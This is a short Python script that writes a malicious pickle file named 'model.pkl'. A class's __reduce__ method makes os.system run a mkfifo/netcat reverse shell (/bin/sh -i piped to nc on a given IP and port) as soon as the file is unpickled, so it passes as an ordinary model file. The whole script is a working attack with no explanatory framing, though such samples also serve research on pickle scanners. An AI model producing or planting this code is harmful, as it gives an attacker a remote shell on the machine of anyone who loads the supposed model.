import pickle
import os
import random
import string


def generate_random_string():
    list_of_chars = random.choices(
        string.ascii_uppercase,
        k=5)
    return ''.join(list_of_chars)


def generate_payload(ip="127.0.0.1", port="14344"):
    r = "/tmp/" + generate_random_string()
    commands = [
        f'rm {r}; mkfifo {r}; cat {r}',
        f'/bin/sh -i 2>&1',
        f'nc {ip} {port} > {r}'
    ]
    return ' | '.join(commands)


PAYLOAD = generate_payload()


class SampleClass:
    def __reduce__(self):
        cmd = (PAYLOAD)
        return os.system, (cmd,)


def generate_pickle():
    obj = SampleClass()
    with open("model.pkl", "wb") as f:
        model = pickle.dump(obj, f)


if __name__ == '__main__':
    generate_pickle()